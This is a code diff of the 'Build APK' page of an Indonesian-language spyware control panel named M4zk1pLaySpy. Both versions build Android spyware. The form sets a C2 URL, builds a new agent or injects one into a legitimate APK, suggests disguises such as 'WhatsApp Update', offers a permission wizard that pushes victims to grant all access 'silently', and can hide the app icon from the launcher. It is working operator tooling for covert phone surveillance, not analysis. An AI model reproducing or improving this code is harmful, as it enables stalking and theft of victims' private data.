@@ -3,219 +3,122 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Build APK — M4zk1pLaySpy</title>
+<title>Build</title>
 <link rel="stylesheet" href="/static/css/style.css">
 </head>
 <body>
-<div class="shell">
-  <aside class="side">
-    <div class="brand"><img src="/static/img/garuda.svg" alt=""><div><b>M4ZK1PL4Y</b><span>SPY CONSOLE</span></div></div>
-    <nav class="nav">
-      <a href="/dashboard">▣ <span class="lbl">DASHBOARD</span></a>
-      <a href="/targets">◈ <span class="lbl">TARGET</span></a>
-      <a href="/build">⚙ <span class="lbl">BUILD APK</span></a>
-      <a href="/dumps">⇩ <span class="lbl">HASIL DUMP</span></a>
-      <a href="/admin">☰ <span class="lbl">ADMIN</span></a>
-    </nav>
-    <div class="side-foot"><div id="clock">--:--:--</div>
-      <div style="margin-top:6px">v1.4.0</div>
-      <a href="#" id="logout" style="display:block;margin-top:10px;color:var(--red)">▸ KELUAR</a></div>
-  </aside>
-
-  <main class="main">
-    <header class="top"><h2 class="glitch" data-t="BUILD APK">BUILD APK</h2>
-      <span class="pill on"><i class="led on"></i>PIPELINE SIAP</span>
-      <div class="spacer"></div><a class="btn sm ghost" href="#hist">RIWAYAT</a></header>
-
-    <div class="content" style="display:grid;grid-template-columns:minmax(0,1.25fr) minmax(0,1fr);gap:14px;align-items:start">
-      <div class="card">
-        <div class="card-h"><b>KONFIGURASI PAYLOAD</b></div>
-        <div class="card-b">
-          <div class="chips" style="margin-bottom:14px">
-            <button class="chip" id="mNew" style="border-color:var(--red);color:#fff">BUILD BARU</button>
-            <button class="chip" id="mPatch">OPREK APK RESMI</button>
-          </div>
-
-          <div class="field" id="apkWrap" hidden>
-            <label>FILE APK RESMI (WAJIB)</label>
-            <div class="drop" id="drop">klik / lepas file .apk di sini</div>
-            <input type="file" id="apkFile" accept=".apk" hidden>
-            <div id="apkInfo" style="font-size:10.5px;color:var(--dim);margin-top:8px"></div>
-          </div>
-
-          <div class="grid g2">
-            <div class="field"><label>NAMA APLIKASI</label><input class="inp" id="name" value="M4zk1pLaySpy" style="letter-spacing:0"></div>
-            <div class="field"><label>PACKAGE</label><input class="inp" id="pkg" placeholder="com.contoh.app" style="letter-spacing:0"></div>
-          </div>
-
-          <div class="field"><label>URL C2 (PUBLIK)</label>
-            <input class="inp" id="c2" style="letter-spacing:0"></div>
-
-          <div class="field"><label>TEKS WIZARD IZIN</label>
-            <textarea class="inp" id="wizard" rows="2" style="letter-spacing:0">Izinkan semua akses agar aplikasi berjalan normal. Tekan IZINKAN SEMUA.</textarea></div>
-
-          <div class="grid g2">
-            <div class="field"><label>IKON (PNG/JPG)</label><div class="drop" id="iconDrop">pilih ikon</div>
-              <input type="file" id="iconFile" accept="image/*" hidden><div id="iconInfo" style="font-size:10px;color:var(--dim)"></div></div>
-            <div class="field"><label>WALLPAPER DEFAULT</label><div class="drop" id="wallDrop">pilih wallpaper</div>
-              <input type="file" id="wallFile" accept="image/*" hidden><div id="wallInfo" style="font-size:10px;color:var(--dim)"></div></div>
-          </div>
-
-          <div class="field">
-            <label>SEMBUNYIKAN IKON DARI LAUNCHER</label>
-            <div class="row"><button class="btn sm ghost" id="hideBtn">TIDAK</button></div>
-          </div>
-
-          <button class="btn full" id="go" style="margin-top:8px">MULAI BUILD</button>
-          <div class="prog" style="margin-top:12px"><i id="prog"></i></div>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-h"><b>LOG PIPELINE</b><div class="spacer"></div><span class="tag" id="bstate">IDLE</span></div>
-        <div class="card-b"><div class="console" id="blog" style="height:300px"></div>
-          <div class="row" style="margin-top:12px"><a class="btn sm" id="dl" hidden>UNDUH APK</a></div>
-        </div>
-      </div>
-    </div>
-
-    <div class="content" id="hist" style="padding-top:0">
-      <div class="card"><div class="card-h"><b>RIWAYAT BUILD</b></div>
-        <div class="card-b" style="padding:0"><table>
-          <thead><tr><th>Nama</th><th>Package</th><th>Mode</th><th>Status</th><th>Ukuran</th><th></th></tr></thead>
-          <tbody id="brows"><tr><td colspan="6" class="empty">belum ada build</td></tr></tbody>
-        </table></div></div>
-    </div>
-  </main>
-</div>
+<div class="win" id="win"></div>
 <div class="toast-wrap" id="tw"></div>
-
 <script type="module">
-import { $, api, post, toast, esc, fmt, clock, markNav } from '/static/js/core.js';
-markNav(); clock($('#clock'));
-$('#logout').onclick = async (e) => { e.preventDefault(); await post('/api/logout'); location.href = '/'; };
+import { $, api, toast, esc, fmt, jitter } from '/static/js/core.js';
+import { chrome, statusbar, svg } from '/static/js/ui.js';
 
-$('#c2').value = location.origin;
-let mode = 'new';
-let hide = false;
-let apkFile = null;
+const win = $('#win');
+chrome(win, {
+  page: 'build', title: 'Build APK',
+  actions: [
+    '<button class="tbtn acc" id="go">' + svg('build') + 'BUILD</button>',
+    '<button class="tbtn" id="rf">' + svg('reload') + 'REFRESH</button>',
+    '<a class="tbtn" href="/pair">' + svg('qr') + 'QR APK</a>',
+  ],
+});
+const body = document.createElement('div');
+body.className = 'body pad';
+win.appendChild(body);
+statusbar(win, '<span class="st"><b>&#9679;</b> BUILDER</span><span class="st-r">v2.1.0</span>');
 
-$('#mNew').onclick = () => {
-  mode = 'new';
-  $('#mNew').style.cssText = 'border-color:var(--red);color:#fff';
-  $('#mPatch').style.cssText = '';
-  $('#apkWrap').hidden = true;
-};
-$('#mPatch').onclick = () => {
-  mode = 'patch';
-  $('#mPatch').style.cssText = 'border-color:var(--red);color:#fff';
-  $('#mNew').style.cssText = '';
-  $('#apkWrap').hidden = false;
-};
+body.innerHTML = `
+<div class="grid g2">
+  <div class="card"><div class="card-h">${svg('build')}KONFIGURASI</div>
+    <div class="card-b">
+      <div class="field"><label>MODE</label>
+        <select class="inp" id="mode">
+          <option value="new">BUILD BARU (agent murni)</option>
+          <option value="patch">INJECT KE APK RESMI</option>
+        </select></div>
+      <div class="field"><label>NAMA TAMPILAN</label>
+        <input class="inp" id="name" placeholder="WhatsApp Update"></div>
+      <div class="field"><label>PACKAGE NAME</label>
+        <input class="inp" id="pkg" placeholder="com.app.saya (kosong = otomatis)"></div>
+      <div class="field"><label>C2 PUBLIC URL</label>
+        <input class="inp" id="c2" placeholder="https://xxxx.trycloudflare.com"></div>
+      <div class="field"><label>WIZARD IZIN</label>
+        <select class="inp" id="wizard">
+          <option value="full">FULL &mdash; semua izin sekali klik</option>
+          <option value="soft">SOFT &mdash; senyap, izin inti</option>
+          <option value="none">NONE &mdash; tanpa wizard</option>
+        </select></div>
+      <label class="check"><input type="checkbox" id="hide" checked> SEMBUNYIKAN IKON DARI LAUNCHER</label>
+      <div class="field" style="margin-top:8px"><label>APK SUMBER (mode inject)</label>
+        <div class="file-drop" id="dApk">klik / drop APK resmi</div>
+        <input type="file" id="fApk" accept=".apk" hidden></div>
+      <div class="grid g2">
+        <div class="field"><label>IKON</label>
+          <div class="file-drop" id="dIcon">ikon</div><input type="file" id="fIcon" accept="image/*" hidden></div>
+        <div class="field"><label>WALLPAPER</label>
+          <div class="file-drop" id="dWall">wallpaper</div><input type="file" id="fWall" accept="image/*" hidden></div>
+      </div>
+      <button class="btn acc" id="go2" style="width:100%;height:30px;margin-top:5px">MULAI BUILD</button>
+    </div></div>
+  <div class="card"><div class="card-h">${svg('term')}ANTRIAN</div>
+    <div style="overflow:auto;max-height:62vh"><table class="tbl">
+      <thead><tr><th>Nama</th><th>Mode</th><th>Status</th><th>Ukuran</th><th></th></tr></thead>
+      <tbody id="rows"></tbody></table></div></div>
+</div>`;
 
-$('#hideBtn').onclick = () => {
-  hide = !hide;
-  $('#hideBtn').textContent = hide ? 'YA — SEMBUNYIKAN' : 'TIDAK';
-  $('#hideBtn').classList.toggle('amber', hide);
-};
-
-function bindDrop(dropId, inputId, infoId, cb) {
-  const d = $(dropId), i = $(inputId);
-  d.onclick = () => i.click();
-  d.ondragover = (e) => { e.preventDefault(); d.classList.add('hot'); };
-  d.ondragleave = () => d.classList.remove('hot');
-  d.ondrop = (e) => {
-    e.preventDefault(); d.classList.remove('hot');
-    if (e.dataTransfer.files[0]) { i.files = e.dataTransfer.files; i.dispatchEvent(new Event('change')); }
-  };
-  i.onchange = () => {
-    const f = i.files[0]; if (!f) return;
-    $(infoId).textContent = `${f.name} · ${fmt.bytes(f.size)}`;
-    cb(f);
+function bind(drop, inp, label) {
+  $(drop).onclick = () => $(inp).click();
+  $(inp).onchange = () => {
+    const f = $(inp).files[0];
+    if (f) { $(drop).classList.add('has'); $(drop).textContent = label + ': ' + f.name; }
   };
 }
+bind('#dApk', '#fApk', 'APK');
+bind('#dIcon', '#fIcon', 'ikon');
+bind('#dWall', '#fWall', 'wallpaper');
 
-bindDrop('#drop', '#apkFile', '#apkInfo', async (f) => {
-  apkFile = f;
-  const fd = new FormData(); fd.append('apk', f);
-  try {
-    const r = await fetch('/api/build/inspect', { method: 'POST', body: fd });
-    const j = await r.json();
-    if (j.package) { $('#pkg').value = j.package; $('#pkg').disabled = true; }
-    $('#apkInfo').textContent = `${f.name} · ${fmt.bytes(f.size)} · ${j.package || 'package tak terbaca'}`;
-  } catch { $('#apkInfo').textContent = f.name; }
-});
-
-bindDrop('#iconDrop', '#iconFile', '#iconInfo', () => {});
-bindDrop('#wallDrop', '#wallFile', '#wallInfo', () => {});
-
-let poll = null;
-$('#go').onclick = async () => {
+async function doBuild() {
+  const mode = $('#mode').value;
+  if (mode === 'patch' && !$('#fApk').files[0]) { toast('Mode inject butuh APK sumber.', 'wn'); return; }
   const fd = new FormData();
   fd.append('mode', mode);
-  fd.append('name', $('#name').value || 'M4zk1pLaySpy');
-  fd.append('package', $('#pkg').value || '');
-  fd.append('c2_url', $('#c2').value || '');
-  fd.append('wizard', $('#wizard').value || '');
-  fd.append('hide', hide ? '1' : '0');
-  if (mode === 'patch') {
-    if (!apkFile) return toast('APK resmi belum dipilih.', 'wn');
-    fd.append('apk', apkFile);
-  }
-  if ($('#iconFile').files[0]) fd.append('icon', $('#iconFile').files[0]);
-  if ($('#wallFile').files[0]) fd.append('wallpaper', $('#wallFile').files[0]);
-
-  $('#go').disabled = true;
-  $('#bstate').textContent = 'ANTRI';
-  $('#blog').innerHTML = '';
-  $('#dl').hidden = true;
+  fd.append('name', $('#name').value);
+  fd.append('package', $('#pkg').value);
+  fd.append('c2_url', $('#c2').value);
+  fd.append('wizard', $('#wizard').value);
+  fd.append('hide', $('#hide').checked ? '1' : '0');
+  if ($('#fApk').files[0]) fd.append('apk', $('#fApk').files[0]);
+  if ($('#fIcon').files[0]) fd.append('icon', $('#fIcon').files[0]);
+  if ($('#fWall').files[0]) fd.append('wallpaper', $('#fWall').files[0]);
+  $('#go2').disabled = true;
   try {
-    const r = await fetch('/api/build/create', { method: 'POST', body: fd });
-    const j = await r.json();
-    if (!r.ok) throw new Error(j.detail || 'gagal');
-    toast('Build masuk antrean: ' + j.id, 'ok');
-    $('#prog').style.width = '6%';
-    clearInterval(poll);
-    poll = setInterval(() => watch(j.id), 1400);
-    loadHist();
-  } catch (e) {
-    toast(e.message, 'wn');
-    $('#go').disabled = false;
-  }
-};
+    const r = await api('/api/build/create', { method: 'POST', body: fd });
+    toast('Build dimulai: ' + r.package, 'ok');
+    list();
+  } catch (e) { toast(e.message, 'wn'); }
+  $('#go2').disabled = false;
+}
+$('#go').onclick = doBuild;
+$('#go2').onclick = doBuild;
+$('#rf').onclick = list;
 
-async function watch(id) {
+async function list() {
   try {
-    const b = await api('/api/build/' + id);
-    $('#bstate').textContent = b.status.toUpperCase();
-    $('#blog').innerHTML = (b.log || '').split('\n').map((l) =>
-      `<div class="${/GAGAL/.test(l) ? 'er' : /SELESAI/.test(l) ? 'ok' : ''}">${esc(l)}</div>`).join('');
-    $('#blog').scrollTop = $('#blog').scrollHeight;
-    if (b.status === 'proses') $('#prog').style.width = '55%';
-    if (b.status === 'selesai') {
-      clearInterval(poll); $('#prog').style.width = '100%';
-      $('#go').disabled = false;
-      $('#dl').hidden = false; $('#dl').href = `/api/build/${id}/download`;
-      toast('APK siap diunduh.', 'ok'); loadHist();
-    }
-    if (b.status === 'gagal') {
-      clearInterval(poll); $('#prog').style.width = '100%';
-      $('#go').disabled = false; toast('Build gagal, cek log.', 'wn'); loadHist();
-    }
+    const d = await api('/api/build');
+    $('#rows').innerHTML = d.builds.map((b) =>
+      '<tr><td>' + esc(b.name || '-') + '<div class="dim" style="font-size:7.5px">' +
+      esc(b.package || '') + '</div></td><td>' + esc(b.mode) + '</td>' +
+      '<td><span class="tag ' + (b.status === 'selesai' ? 'on' : b.status === 'gagal' ? 'acc' : 'warn') + '">' +
+      esc(b.status) + '</span></td><td>' + fmt.bytes(b.size) + '</td>' +
+      '<td>' + (b.status === 'selesai'
+        ? '<a class="btn xs ok" href="/api/build/' + esc(b.id) + '/download">UNDUH</a>' : '') +
+      '</td></tr>').join('') || '<tr><td colspan="5" class="empty">belum ada build</td></tr>';
   } catch {}
 }
 
-async function loadHist() {
-  const d = await api('/api/build');
-  $('#brows').innerHTML = d.builds.map((b) => `
-    <tr><td>${esc(b.name)}</td><td class="mono">${esc(b.package || '-')}</td>
-      <td><span class="tag">${esc(b.mode)}</span></td>
-      <td><span class="tag ${b.status === 'selesai' ? 'on' : b.status === 'gagal' ? 'er' : ''}">${esc(b.status)}</span></td>
-      <td>${fmt.bytes(b.size)}</td>
-      <td>${b.outfile ? `<a class="btn sm ghost" href="/api/build/${esc(b.id)}/download">UNDUH</a>` : ''}</td></tr>`)
-    .join('') || '<tr><td colspan="6" class="empty">belum ada build</td></tr>';
-}
-loadHist();
+api('/api/tunnel/status').then((s) => { if (s.url) $('#c2').value = s.url; }).catch(() => {});
+list();
+setInterval(list, jitter(4000, 2500));
 </script>
 </body>
 </html>
